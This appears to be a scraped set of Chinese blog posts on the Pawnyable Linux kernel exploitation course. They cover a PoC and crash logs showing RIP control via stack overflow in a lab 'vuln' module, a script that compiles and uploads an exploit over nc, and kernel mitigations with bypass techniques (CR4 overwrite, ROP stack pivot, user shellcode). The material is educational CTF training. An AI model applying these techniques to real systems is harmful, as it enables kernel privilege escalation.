RSI: 0000000000000000 RDI: ffffc9000044c000 RBP: ffffc9000044ba78 R08: 4141414141414141 R09: 0000000000000000 R10: ffffc9000044c000 R11: 4141414141414141 R12: ffffc9000044baa8 R13: 00000000000002a8 R14: 00007ffd3f100c60 R15: ffffc9000044bef8 FS: 00000000006021d8(0000) GS:ffff888003800000(0000) knlGS:0000000000000000 CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033 CR2: ffffc9000044c000 CR3: 00000000032b6000 CR4: 00000000000006f0 Call Trace: ? _copy_from_user+0x70/0x80 module_write+0x75/0xef [vuln] Modules linked in: vuln(O) ---[ end trace b57c9adbb0ec8f53 ]--- RIP: 0010:memset_orig+0x33/0xb0 Code: 01 01 01 01 01 01 01 01 48 0f af c1 41 89 f9 41 83 e1 07 75 70 48 89 d1 48 c1 e9 06 74 39 66 0f 1f 84 00 00 00 00 00 48 ff c9 &lt;48&gt; 89 07 48 89 47 08 48 89 47 10 48 89 47 18 48 89 47 20 48 89 47 RSP: 0018:ffffc9000044ba58 EFLAGS: 00000207 RAX: 0000000000000000 RBX: 0000000000000558 RCX: 0000000000000009 RDX: 00000000000002a8 RSI: 0000000000000000 RDI: ffffc9000044c000 RBP: ffffc9000044ba78 R08: 4141414141414141 R09: 0000000000000000 R10: ffffc9000044c000 R11: 4141414141414141 R12: ffffc9000044baa8 R13: 00000000000002a8 R14: 00007ffd3f100c60 R15: ffffc9000044bef8 FS: 00000000006021d8(0000) GS:ffff888003800000(0000) knlGS:0000000000000000 CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033 CR2: ffffc9000044c000 CR3: 00000000032b6000 CR4: 00000000000006f0 Kernel panic - not syncing: Fatal exception Kernel Offset: disabled 确实崩溃了，而RIP的值如下，不是想要的0x4141414141414141。（如果是0x4141414141414141，那么就说明可以控制栈里的返回地址） RIP: 0010:memset_orig+0x33/0xb0 看看崩溃的原因，栈溢出导致stack guard page（栈保护页）被写了，然后系统检测到了就崩溃了。 BUG: stack guard page was hit at (____ptrval____) (stack is (____ptrval____)..(____ptrval____)) kernel stack overflow (page fault): 0000 [#1] PREEMPT SMP NOPTI 所以是写太多了，修改poc，把数据的长度写成0x420试试。 char buf[0x420] = {}; memset(buf, 'A', 0x420); write(fd, buf, 0x420); 再次运行，果然RIP可控了： / # ./exploit general protection fault: 0000 [#1] PREEMPT SMP NOPTI CPU: 0 PID: 162 Comm: exploit Tainted: G O 5.10.7 #1 Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014 RIP: 0010:0x4141414141414141 &lt;--- RIP可控 Code: Unable to access opcode bytes at RIP 0x4141414141414117. RSP: 0018:ffffc9000044beb8 EFLAGS: 00000202 RAX: 0000000000000420 RBX: ffff88800318ad00 RCX: 0000000000000000 RDX: 000000000000007f RSI: ffffc9000044bea8 RDI: ffff888003297800 RBP: 4141414141414141 R08: 4141414141414141 R09: 4141414141414141 R10: 4141414141414141 R11: 4141414141414141 R12: 0000000000000420 R13: 0000000000000000 R14: 00007fff598abd30 R15: ffffc9000044bef8 FS: 00000000006021d8(0000) GS:ffff888003800000(0000) knlGS:0000000000000000 CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033 CR2: 0000000000601fd8 CR3: 00000000032e2000 CR4: 00000000000006f0 Call Trace: ? ksys_write+0x53/0xd0 ? __x64_sys_write+0x15/0x20 ? do_syscall_64+0x38/0x50 ? entry_SYSCALL_64_after_hwframe+0x44/0xa9 Modules linked in: vuln(O) ---[ end trace da72dd73f8a32261 ]--- RIP: 0010:0x4141414141414141 Code: Unable to access opcode bytes at RIP 0x4141414141414117. RSP: 0018:ffffc9000044beb8 EFLAGS: 00000202 RAX: 0000000000000420 RBX: ffff88800318ad00 RCX: 0000000000000000 RDX: 000000000000007f RSI: ffffc9000044bea8 RDI: ffff888003297800 RBP: 4141414141414141 R08: 4141414141414141 R09: 4141414141414141 R10: 4141414141414141 R11: 4141414141414141 R12: 0000000000000420 R13: 0000000000000000 R14: 00007fff598abd30 R15: ffffc9000044bef8 FS: 00000000006021d8(0000) GS:ffff888003800000(0000) knlGS:0000000000000000 CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033 CR2: 0000000000601fd8 CR3: 00000000032e2000 CR4: 00000000000006f0 Kernel panic - not syncing: Fatal exception Kernel Offset: disabled 参考文献 https://pawnyable.cafe/linux-kernel/LK01/welcome-to-holstein.html https://deepinout.com/linux-kernel-api/device-driver-and-device-management/linux-kernel-api-cdev_init.html ","link":"https://lzxzl.github.io/post/pawnyable4-shou-xi-holstein-mo-kuai-yu-hong-fa-lou-dong/"},{"title":"Pawnyable3 - 编译和传输exp","content":"在qemu上运行exp 在 qemu 上编写、构建和运行exp很麻烦，因为每次内核崩溃时，都必须重新开始。所以在本地编译好exp后再把它发送到 qemu会方便的多。 又由于每次都输入一大串命令很麻烦，所以把这些命令放在一个 shell 脚本transfer.sh里，每次执行这个脚本就好了。 #!/bin/sh gcc exploit.c -o exploit # gcc编译exploit.c mv exploit rootfs # 将编译结果exploit移动到rootfs（之前第一篇文章解压的那个目录） cd rootfs; find . -print0 | cpio -o --null --format=newc --owner=root &gt; ../debugfs.cpio cd ../ qemu-system-x86_64 \\ -m 64M \\ -nographic \\ -kernel bzImage \\ -append &quot;console=ttyS0 loglevel=3 oops=panic panic=-1 nopti nokaslr&quot; \\ -no-reboot \\ -cpu qemu64 \\ -gdb tcp::12345 \\ -smp 1 \\ -monitor /dev/null \\ -initrd debugfs.cpio \\ -net nic,model=virtio \\ -net user exploit.c 代码如下 #include &lt;stdio.h&gt; int main() { puts(&quot;Hello, World!&quot;); return 0; } 将这两个文件放在qemu目录下，如下所示： lzx@ubuntu:~/LKPWN/pawnyable/LK01/qemu$ ls bzImage exploit.c rootfs rootfs.cpio rootfs_updated.cpio run.sh transfer.sh 然后执行transfer.sh以启动qemu，最后在qemu中执行exploit，但是得到这样的错误： [ Holstein v1 (LK01) - Pawnyable ] / # ./exploit sh: ./exploit: not found / # 为什么? 因为这个镜像中使用的库为 uClibc ，而不是通常的 libc。而编译exploit的环境使用的是GCC，也就是libc，所以动态链接失败，exploit也不起作用。 因此，在 qemu 上运行 exploit 时，要注意静态链接它们。那么，修改脚本： gcc exploit.c -o exploit -static 再次重新运行，那么程序应该可以正常工作： [ Holstein v1 (LK01) - Pawnyable ] / # ./exploit Hello, World! / # 小结： 将exp源文件和transfer.sh（视情况可能要做一定改变）放在qemu目录下 执行脚本transfer.sh 在远程机器上运行exp 本次分发的环境设置为允许网络连接，所以如果想远程执行，可以在qemu上使用wget命令传输exp。 但是在CTF等一些环境中，网络是不可用的。在这种情况下，有必要使用 busybox 中的命令远程传输二进制文件。一般使用base64，但是用GCC构建的文件有几百K到几十M，比如前面编译的exploit的大小就是826K，传输很费时间。文件大小的增加是由于外部库 （libc） 函数的静态链接。 lzx@ubuntu:~/LKPWN/pawnyable/LK01/qemu/rootfs$ ls -lh | grep exploit -rwxrwxr-x 1 lzx lzx 826K Mar 11 00:26 exploit 如果想使用 GCC，并保持较小的大小，那么应该避免使用 libc 并使用系统调用（内联汇编）来自己定义读、写等，当然这是非常困难的。 所以许多 CTFer 使用名为 musl-gcc 的 C 编译器来进行内核利用。它可以从 https://www.musl-libc.org/ 下载源码，然后根据文档 https://git.musl-libc.org/cgit/musl/tree/INSTALL 进行构建并完成安装。 # 下载 lzx@ubuntu:~/tools$ wget https://musl.libc.org/releases/musl-1.2.3.tar.gz --2023-03-11 00:59:06-- https://musl.libc.org/releases/musl-1.2.3.tar.gz Resolving musl.libc.org (musl.libc.org)... 45.63.0.111, 2001:19f0:4009:4061:5400:ff:fe11:6da2 Connecting to musl.libc.org (musl.libc.org)|45.63.0.111|:443... connected. HTTP request sent, awaiting response... 200 OK Length: 1058642 (1.0M) [application/gzip] Saving to: ‘musl-1.2.3.tar.gz’ musl-1.2.3.tar.gz 100%[=============================================================================================================================&gt;] 1.01M 881KB/s in 1.2s 2023-03-11 00:59:09 (881 KB/s) - ‘musl-1.2.3.tar.gz’ saved [1058642/1058642] # 解压 lzx@ubuntu:~/tools$ tar -xzf musl-1.2.3.tar.gz lzx@ubuntu:~/tools$ cd musl-1.2.3/ # 运行配置文件 lzx@ubuntu:~/tools/musl-1.2.3$ ./configure ...... # 编译 lzx@ubuntu:~/tools/musl-1.2.3$ make ...... # 安装 lzx@ubuntu:~/tools/musl-1.2.3$ sudo make install ...... ./tools/install.sh -D obj/musl-gcc /usr/local/musl/bin/musl-gcc 安装完以后，就来使用了。使用musl-gcc编译exploit，然后移动到rootfs目录下（当然这一步可以省略，我只是为了保持统一）： lzx@ubuntu:~/LKPWN/pawnyable/LK01/qemu$ /usr/local/musl/bin/musl-gcc exploit.c -o exploit -static lzx@ubuntu:~/LKPWN/pawnyable/LK01/qemu$ mv exploit rootfs lzx@ubuntu:~/LKPWN/pawnyable/LK01/qemu$ ls -lh rootfs | grep exploit -rwxrwxr-x 1 lzx lzx 11K Mar 11 01:16 exploit 可以看到exploit的大小由826K变成了11K。如果想让它更小，可以用 strip 等删除调试符号。 有些头文件（Linux内核类型）不在musl-gcc中，所以需要设置include路径或者用gcc编译。在这种情况下，先通过gcc汇编器构建.S文件，然后使用musl-gcc进行编译，就可以在使用 gcc 函数的同时，又减小文件大小。 $ gcc -S sample.c -o sample.S $ musl-gcc sample.S -o sample.elf 最后编写一个脚本来使用 base64 远程传输（通过 nc）二进制文件。每次CTF都可能会用到这个上传器，所以建议大家自己制作一个模板。 from ptrlib import * import time import base64 import os def run(cmd): sock.sendlineafter(&quot;# &quot;, cmd) # 这个需要根据情况改变，我这里的run.sh是以root启动qemu的，所以是# sock.recvline() with open(&quot;./rootfs/exploit&quot;, &quot;rb&quot;) as f: # 同样，这个exploit的路径也是要根据情况改变 payload = bytes2str(base64.b64encode(f.read())) #sock = Socket(&quot;HOST&quot;, PORT) # remote sock = Process(&quot;./run.sh&quot;) run('cd /tmp') logger.info(&quot;Uploading...&quot;) for i in range(0, len(payload), 512): print(f&quot;Uploading... {i:x} / {len(payload):x}&quot;) run('echo &quot;{}&quot; &gt;&gt; b64exp'.format(payload[i:i+512])) run('base64 -d b64exp &gt; exploit') run('rm b64exp') run('chmod +x exploit') sock.interactive() 然后执行这个脚本，要注意的一点是最好使用3.8及之后的python，不然 pip 安装完 ptrlib 之后，使用的时候仍可能报错。 lzx@ubuntu:~/LKPWN/pawnyable/LK01/qemu$ python -V Python 3.9.16 (feeb267ead3e6771d3f2f49b83e1894839f64fb7, Dec 29 2022, 14:23:21) [PyPy 7.3.11 with GCC 10.2.1 20210130 (Red Hat 10.2.1-11)] lzx@ubuntu:~/LKPWN/pawnyable/LK01/qemu$ python upload_exp.py [+] __init__: Successfully created new process (PID=83381) [+] &lt;module&gt;: Uploading... Uploading... 0 / 3780 Uploading... 200 / 3780 Uploading... 400 / 3780 Uploading... 600 / 3780 Uploading... 800 / 3780 Uploading... a00 / 3780 Uploading... c00 / 3780 Uploading... e00 / 3780 Uploading... 1000 / 3780 Uploading... 1200 / 3780 Uploading... 1400 / 3780 Uploading... 1600 / 3780 Uploading... 1800 / 3780 Uploading... 1a00 / 3780 Uploading... 1c00 / 3780 Uploading... 1e00 / 3780 Uploading... 2000 / 3780 Uploading... 2200 / 3780 Uploading... 2400 / 3780 Uploading... 2600 / 3780 Uploading... 2800 / 3780 Uploading... 2a00 / 3780 Uploading... 2c00 / 3780 Uploading... 2e00 / 3780 Uploading... 3000 / 3780 Uploading... 3200 / 3780 Uploading... 3400 / 3780 Uploading... 3600 / 3780 [ptrlib]$ /tmp # ls -lah ls -lah [ptrlib]$ total 44K drwxrwxrwt 2 root root 100 Mar 10 18:28 . drwxrwxr-x 17 root dhcpcd 420 Mar 10 18:28 .. -rwxr-xr-x 1 root root 10.4K Mar 10 18:28 exploit -rw-r--r-- 1 root root 27.9K Mar 10 18:28 messages -rw-r--r-- 1 root root 149 Mar 10 18:28 resolv.conf /tmp # ./exploit .[ptrlib]$ /exploit Hello, World! /tmp # 最后小结一下： 在本地用musl编译好exp（如果有需要，将编译好的文件移动到某个目录下） /usr/local/musl/bin/musl-gcc exploit.c -o exploit -static 根据实际情况，稍微修改上传脚本，然后执行脚本，将exp发送到qemu中： python upload_exp.py ","link":"https://lzxzl.github.io/post/pawnyable3-bian-yi-he-chuan-shu-exp/"},{"title":"Pawnyable2 - Linux Kernel 漏洞缓解技术","content":"本文是以pawnyable里对内核漏洞缓解技术的文章security mechanism的学习、扩展。借鉴ctf-wiki里对内核漏洞缓解技术的分类方式，从异常检测、随机化、隔离、访问控制四个角度来学习内核中的防御机制。其中有部分文字从ctf-wiki 和 容器环境相关的内核漏洞缓解技术 直接拷贝的。 异常检测 Kernel Stack Canary 开始学内核pwn，那大概率已经学过用户态pwn了，就不介绍Canary了。顾名思义，此种技术就是内核里的Canary。 在 x86 架构中，同一个 task 中使用相同的 Canary。 查看开启状态 可以使用如下方式来检查是否开启了 Canary 保护： checksec 人工分析二进制文件，看函数中是否有保存和检查 Canary 的代码 开启 在编译内核时，设置 CONFIG_CC_STACKPROTECTOR 选项，来开启该保护。 关闭 关闭编译选项并重新编译内核，才可以关闭 Canary 保护。 绕过 根据 x86 架构下 Canary 实现的特点，只要泄漏了一次系统调用中的 Canary，同一 task 的其它系统调用中的 Canary 也就都被泄漏了。 随机化 KASLR KASLR（Kernel Address Space Layout Randomization，内核地址空间布局随机化） FGKASLR（Function Granular KASLR，函数粒度的KASLR） KASLR就是内核中的ASLR。同样不详细介绍ASLR了，可自己去找例子熟悉ASLR。 /proc/sys/kernel/randomize_va_space值为0时，ASLR完全关闭； 值为1时，仅仅对mmap基址、栈地址和VDSO页地址做随机化处理（共享库也将被加载到随机地址） 值为2时，在值为1的基础上，加上对堆的随机化。 查看开启状态 可以通过比较两次系统启动时的内核基址来判断KASLR是否开启，例如： lzx@ubuntu:~/LKPWN/pawnyable$ sudo cat /proc/kallsyms | grep 'T startup_64' ffffffff9be00000 T startup_64 lzx@ubuntu:~/LKPWN/pawnyable$ sudo init 6 # 重启 lzx@ubuntu:~/LKPWN/pawnyable$ sudo cat /proc/kallsyms | grep 'T startup_64' ffffffffaa800000 T startup_64 从上述输出可以看到，第一次系统启动时内核基址是ffffffff9be00000，重启后变为ffffffffaa800000，说明KASLR开启。由于之前没有对KASLR的配置做过更改，所以也说明KASLR是默认开启的。 关闭 物理机/虚拟机 通过修改/etc/default/grub文件来达到目的。找到该文件中的GRUB_CMDLINE_LINUX配置项，在最后加上nokaslr，例如： GRUB_CMDLINE_LINUX=&quot;find_preseed=/preseed.cfg auto noprompt priority=critical locale=en_US nokaslr&quot; 然后执行更新即可： lzx@ubuntu:~/LKPWN/pawnyable$ sudo update-grub Sourcing file `/etc/default/grub' Generating grub configuration file ... Found linux image: /boot/vmlinuz-5.4.0-135-generic Found initrd image: /boot/initrd.img-5.4.0-135-generic Found linux image: /boot/vmlinuz-5.4.0-90-generic Found initrd image: /boot/initrd.img-5.4.0-90-generic Found memtest86+ image: /boot/memtest86+.elf Found memtest86+ image: /boot/memtest86+.bin done 再次重启，可以发现地址已经变成了默认值ffffffff81000000，说明KASLR已经被关闭： lzx@ubuntu:~/LKPWN/pawnyable$ sudo cat /proc/kallsyms | grep 'T startup_64' ffffffff81000000 T startup_64 qemu 如果是使用 qemu 启动的内核，可以在 -append 选项中添加 nokaslr 来关闭 KASLR。 开启 物理机/虚拟机 修改/etc/default/grub文件，找到该文件中的GRUB_CMDLINE_LINUX配置项，去掉nokaslr。 qemu 如果是使用 qemu 启动的内核，可以在 -append 选项中添加 kaslr 来开启 KASLR。 绕过 与ASLR类似，KASLR也提高了攻击者对内核漏洞的利用门槛。例如，内核漏洞往往被用来进行提升权限或从容器中逃逸。攻击者在利用漏洞劫持控制流后，往往会去调用一个经典的内核函数组合以获取高权限： commit_creds(prepare_creds()); 系统启用KASLR后，攻击者在exploit中直接使用默认的内核符号地址就不再有效，攻击成本提高。然而，KASLR并不是完美的，后面提到的几种打印符号地址的方法即可能用来绕过KASLR。 同绕过ASLR一样，只要通过泄漏内核某个段的地址，就可以得到这个段内的所有地址。比如当我们泄漏了内核的代码段地址，就知道内核代码段的所有地址。 FGKASLR 2020 年，出现了更强大的 KASLR，称为FGKASLR （Function Granular KASLR）。，它默认被禁用。这是一项为每个 Linux 内核函数随机化地址的技术。即FGKASLR 在 KASLR 基地址随机化的基础上，在加载时刻，以函数粒度重新排布内核代码。 这项技术使得攻击者即使可以泄露Linux内核中某个函数的地址，也无法获取到基地址。但是，FGKASLR 并没有随机化数据部分，因此如果可以泄露数据的地址，就可以找到基地址。当然，不能从基地址中获取特定函数的地址，但可以用于特殊攻击向量。 目前，FGKASLR 只支持 x86_64 架构。其实现相对比较简单，主要在两个部分进行了修改。 编译阶段 加载阶段 开启 如果想要开启内核的 FGKASLR，需要开启 CONFIG_FG_KASLR=y 选项。 FGKASLR 也支持模块的随机化，尽管 FGKASLR 只支持 x86_64 架构下的内核，但是该特性可以支持其它架构下的模块。可以使用 CONFIG_MODULE_FG_KASLR=y 来开启这个特性。 关闭 通过在命令行使用 nokaslr 关闭 KASLR 也同时会关闭 FGKASLR。当然，我们可以单独使用 nofgkaslr 来关闭 FGKASLR。 关于FGKASLR更详细的内容可参考ctf-wiki-fgkaslr。 隔离 默认（User&amp;Kernel） 用户态不可以直接访问内核态的数据、执行内核态的代码。 SMEP（User&amp;Kernel） SMEP（Supervisor Mode Execution Prevention，管理模式执行保护）。SMEP基于CPU提供的新特性，用来阻止不受信任应用程序以特权模式执行用户空间的代码，类似于NX。 出现的原因 起初，在内核态执行代码时，可以直接执行用户态的代码。那如果攻击者控制了内核中的执行流，就可以执行处于用户态的代码。由于用户态的代码是攻击者可控的，所以更容易实施攻击。为了防范这种攻击，研究者提出当位于内核态时，不能执行用户态的代码。在 Linux 内核中，这个防御措施的实现是与指令集架构相关的。 下面看看这种攻击场景：攻击者利用内核空间的漏洞控制了 RIP，同时攻击者在用户空间中准备了一段shellcode。如果SMEP被禁用，那么用户空间中的shellcode将会被执行。反之，如果SMEP开启了，执行shellcode时则会导致内核崩溃。 // mmap一段空间 char *shellcode = mmap( NULL , 0x1000 , PROT_READ|PROT_WRITE|PROT_EXECUTE, MAP_ANONYMOUS | MAP_PRIVATE, -1 , 0 ); // 将shellcode拷贝到刚刚分配的那段内存空间中 memcpy (shellcode, SHELLCODE, sizeof (SHELLCODE)); // 控制rip指向shellcode control_rip(shellcode); // RIP = shellcode 函数：void *mmap(void *start,size_t length,int prot,int flags,int fd,off_t offsize); 功能（三种） 1、将一个普通文件映射到内存中，通常在需要对文件进行频繁读写时使用，这样用内存读写取代I/O读写，以获得较高的性能； 2、将特殊文件进行匿名内存映射，可以为关联进程提供共享内存空间； 3、为无关联的进程提供共享内存空间，一般也是将一个普通文件映射到内存中。 参数 start：指向欲映射的内存起始地址，通常设为 NULL，代表让系统自动选定地址，映射成功后返回该地址。 length：代表将文件中多大的部分映射到内存。 prot：映射区域的保护方式。可以为以下几种方式的组合： PROT_EXEC 映射区域可被执行 PROT_READ 映射区域可被读取 PROT_WRITE 映射区域可被写入 PROT_NONE 映射区域不能存取 flags：影响映射区域的各种特性。在调用mmap()时必须要指定MAP_SHARED 或MAP_PRIVATE。 MAP_FIXED 如果参数start所指的地址无法成功建立映射时，则放弃映射，不对地址做修正。通常不鼓励用此旗标。 MAP_SHARED对映射区域的写入数据会复制回文件内，而且允许其他映射该文件的进程共享。 MAP_PRIVATE 对映射区域的写入操作会产生一个映射文件的复制，即private的“写入时复制”（copy on write）对此区域作的任何修改都不会写回原来的文件内容。 MAP_ANONYMOUS建立匿名映射。此时会忽略参数fd，不涉及文件，而且映射区域无法和其他进程共享。 MAP_DENYWRITE只允许对映射区域的写入操作，其他对文件直接写入的操作将会被拒绝。 MAP_LOCKED 将映射区域锁定住，这表示该区域不会被置换（swap）。 fd：要映射到内存中的文件描述符。如果使用匿名内存映射时，即flags中设置了MAP_ANONYMOUS，fd设为-1。有些系统不支持匿名内存映射，则可以使用fopen打开/dev/zero文件，然后对该文件进行映射，可以同样达到匿名内存映射的效果。 offset：文件映射的偏移量，通常设置为0，代表从文件最前方开始对应，offset必须是分页大小的整数倍。 返回值：若映射成功则返回映射区的内存起始地址，否则返回MAP_FAILED(－1)，错误原因存于errno 中。 错误代码 EBADF 参数fd 不是有效的文件描述词 EACCES 存取权限有误。如果是MAP_PRIVATE 情况下文件必须可读，使用MAP_SHARED则要有PROT_WRITE以及该文件要能写入。 EINVAL 参数start、length 或offset有一个不合法。 EAGAIN 文件被锁住，或是有太多内存被锁住。 ENOMEM 内存不足。 查看开启状态 SMEP的开闭受CPU中CR4寄存器第20标识位的控制： 标识位设置1时，保护开启； 标识位设置0时，保护关闭。 下图为x86架构下的CR4寄存器。 可以从/proc/cpuinfo来知晓 SMEP是否开启，输出结果中flags包含了smep和smap，即说明SMEP/SMAP处于开启状态。下面有四个结果是因为这个虚拟机是4核的，且4个都开启了smep。 lzx@ubuntu:~/LKPWN/pawnyable$ cat /proc/cpuinfo | grep smep flags : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ss syscall nx pdpe1gb rdtscp lm constant_tsc arch_perfmon nopl xtopology tsc_reliable nonstop_tsc cpuid pni pclmulqdq ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avx f16c rdrand hypervisor lahf_lm abm 3dnowprefetch cpuid_fault invpcid_single pti ssbd ibrs ibpb stibp fsgsbase tsc_adjust bmi1 avx2 smep bmi2 invpcid rdseed adx smap clflushopt xsaveopt xsavec xgetbv1 xsaves arat md_clear flush_l1d arch_capabilities flags : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ss syscall nx pdpe1gb rdtscp lm constant_tsc arch_perfmon nopl xtopology tsc_reliable nonstop_tsc cpuid pni pclmulqdq ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avx f16c rdrand hypervisor lahf_lm abm 3dnowprefetch cpuid_fault invpcid_single pti ssbd ibrs ibpb stibp fsgsbase tsc_adjust bmi1 avx2 smep bmi2 invpcid rdseed adx smap clflushopt xsaveopt xsavec xgetbv1 xsaves arat md_clear flush_l1d arch_capabilities flags : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ss syscall nx pdpe1gb rdtscp lm constant_tsc arch_perfmon nopl xtopology tsc_reliable nonstop_tsc cpuid pni pclmulqdq ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avx f16c rdrand hypervisor lahf_lm abm 3dnowprefetch cpuid_fault invpcid_single pti ssbd ibrs ibpb stibp fsgsbase tsc_adjust bmi1 avx2 smep bmi2 invpcid rdseed adx smap clflushopt xsaveopt xsavec xgetbv1 xsaves arat md_clear flush_l1d arch_capabilities flags : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ss syscall nx pdpe1gb rdtscp lm constant_tsc arch_perfmon nopl xtopology tsc_reliable nonstop_tsc cpuid pni pclmulqdq ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avx f16c rdrand hypervisor lahf_lm abm 3dnowprefetch cpuid_fault invpcid_single pti ssbd ibrs ibpb stibp fsgsbase tsc_adjust bmi1 avx2 smep bmi2 invpcid rdseed adx smap clflushopt xsaveopt xsavec xgetbv1 xsaves arat md_clear flush_l1d arch_capabilities 开启 物理机/虚拟机 默认情况下，SMEP 保护是开启的。上面查看的/proc/cpuinfo是虚拟机的默认情况，可以看出时默认开启的。 qemu 我在LK01上测试的结果是，默认关闭smep。若要qemu 启动内核时启用SMEP，设置如下参数： -cpu qemu64,+smep 修改LK01的run.sh，启用SMEP： 关闭 在 /etc/default/grub 的如下两行中添加 nosmep GRUB_CMDLINE_LINUX_DEFAULT=&quot;quiet&quot; GRUB_CMDLINE_LINUX=&quot;initrd=/install/initrd.gz&quot; 然后运行 update-grub 并且重启系统就可以关闭 smep。 如果是使用 qemu-system-x86_64启动的内核，默认是关闭 SMEP的。 绕过 把 CR4 寄存器中的第 20 位置为 0 后，我们就可以执行用户态的代码。一般而言，我们会使用 0x6f0 来设置 CR4，这样 SMAP 和 SMEP 都会被关闭。 内核中修改 cr4 的代码最终会调用到 native_write_cr4，当我们能够劫持控制流后，我们可以执行内核中的 gadget 来修改 CR4。从另外一个维度来看，内核中存在固定的修改 cr4 的代码，比如在 refresh_pce 函数、set_tsc_mode 等函数里都有。 具体的例子等后面遇到的时候再看吧。 SMAP（User&amp;Kernel ） SMAP（Supervisor Mode Access Prevention，管理模式访问保护）建立在SMEP的基础上，可以视为SMEP的补充。用户空间不能读写内核空间的内存，这对于安全来说是理所当然的。而通过SMAP可阻止不受信任应用程序以特权模式读写用户空间的数据。 出现的原因 为什么要阻止从高权限内核空间往低权限用户空间中读取和写入数据呢？有两个原因： 阻止栈迁移：在劫持控制流后，攻击者可以通过栈迁移将栈迁移到用户态，然后进行 ROP，进一步达到提权的目的 防止内核编程错误导致的问题。 阻止Stack Pivot 在SMEP给出的例子中，即使可以控制RIP，也无法执行shellcode。但是别忘了，还有gadget这东西。比如： mov esp, 0x12345678; ret; 无论移入 ESP 的值是什么，当调用此 ROP gadget时，RSP 都会更改为该值。若攻击者同时在0x12345678如此布局： void *p = mmap( 0x12340000 , 0x10000 , ...); unsigned long *chain = ( unsigned long *)(p + 0x5678 ); *chain++ = rop_pop_rdi; *chain++ = 0 ; *chain++ = ...; .. . control_rip（rop_mov_esp_12345678h）； /** 把0x12345678当作栈，布局如下： 0x12345678 0x12345680 rop_pop_rdi 0x12345688 0 ...... **/ 那么，即使启用了 SMEP，攻击者也可以通过获取 RIP 来执行上面的 ROP 链。 但是，如果启用了SMAP，则在用户空间（ROP 链）中映射的数据在内核空间中是不可见的，也就是没法把栈迁移到0x12345678。所以 stack pivot 时指令ret会导致内核崩溃。因此，SMEP 之外再启用 SMAP，可以缓解 ROP 的攻击。 防止内核编程错误 内核驱动 char buffer[0x10]; static long mydevice_ioctl(struct file *filp, unsigned int cmd, unsigned long arg) { if (cmd == 0xdead) { // 若cmd为0xdead，则将用户空间数据拷贝到内核空间 memcpy(buffer, arg, 0x10); } else if (cmd == 0xcafe) {// 若cmd为0xcafe，则将内核空间数据拷贝到用户空间 memcpy(arg, buffer, 0x10); } return } 用户 int fd = open(&quot;/dev/mydevice&quot;, O_RDWR); char src[0x10] = &quot;Hello, World!&quot;; char dst[0x10]; ioctl(fd, 0xdead, src); // 将 &quot;Hello, World!&quot; 拷贝到内核的buffer中 ioctl(fd, 0xcafe, dst); // 从内核的buffer拷贝数据到用户空间的dst printf(&quot;%s\\n&quot;, dst); // --&gt; Hello, World! memcpy的长度是0x10，好像没问题。但是如果SMAP 被禁用的时候，执行下面这样的代码： ioctl(fd，0xdead，0xffffffffdeadbeef); 0xffffffffdeadbeef是用户空间的无效地址，但假设这是一个包含 Linux 内核中的秘密数据的地址。然后驱动执行memcpy，会将秘密数据拷贝到buffer，然后这个驱动就能读取到这个秘密数据了，这就导致了AAR。 memcpy(buffer, 0xffffffffdeadbeef, 0x10); 同样，若传入的cmd为0xcafe，也能修改那个秘密数据，导致AAW。 查看开启状态 SMAP的开闭受CPU中CR4寄存器第21标识位的控制： 标识位设置1时，保护开启； 标识位设置0时，保护关闭。 因此，一种绕过SMAP的手段是在高权限下通过修改CR4寄存器来关闭它。 同SMEP，可以从/proc/cpuinfo来知晓 SMAP是否开启： # 查看smap是否开启 cat /proc/cpuinfo | grep smap # 查看smep/smap是否开启 cat /proc/cpuinfo | grep -E &quot;smep|smap&quot; 开启 物理机/虚拟机 默认开启。 qemu 同SMEP，只不过将smep换成smap： -cpu qemu64,+smap 关闭 在 /etc/default/grub 的如下两行中添加 nosmap GRUB_CMDLINE_LINUX_DEFAULT=&quot;quiet&quot; GRUB_CMDLINE_LINUX=&quot;initrd=/install/initrd.gz&quot; 然后运行 update-grub ，重启系统就可以关闭 smap。 绕过 设置 CR4 寄存器 把 CR4 寄存器中的第 21 位置为 0 后，我们就可以访问用户态的数据。一般而言，我们会使用 0x6f0 来设置 CR4，这样 SMAP 和 SMEP 都会被关闭。 内核中修改 cr4 的代码最终会调用到 native_write_cr4，当我们能够劫持控制流后，我们就可以执行内核中对应的 gadget 来修改 CR4。从另外一个维度来看，内核中存在固定的修改 cr4 的代码，比如在 refresh_pce 函数、set_tsc_mode 等函数里都有。 copy_from/to_user 在劫持控制流后，攻击者可以调用 copy_from_user 和 copy_to_user 来访问用户态的内存。这两个函数会临时清空禁止访问用户态内存的标志。 KPTI（User&amp;Kernel） KPTI（Kernel page-table isolation，内核页表隔离）也简称PTI，旧称KAISER。2018 年，在 Intel 等 CPU 上发现了一种名为Meltdown的侧信道攻击。该攻击可以用用户权限读取内核空间内存，并且可以绕过KASLR。 为了缓解改漏洞，提出了 KPTI 机制。该机制使得内核态空间的内存和用户态空间的内存的隔离进一步得到了增强。 内核态中的页表包括用户空间内存的页表和内核空间内存的页表。 用户态的页表只包括用户空间内存的页表以及必要的内核空间内存的页表，如用于处理系统调用、中断等信息的内存。 在 x86_64 的 PTI 机制中，内核态的用户空间内存映射部分被全部标记为不可执行。也就是说，之前不具有 SMEP 特性的硬件，如果开启了 KPTI 保护，也具有了类似于 SMEP 的特性。此外，SMAP 模拟也可以以类似的方式引入，只是现在还没有引入。因此，在目前开启了 KPTI 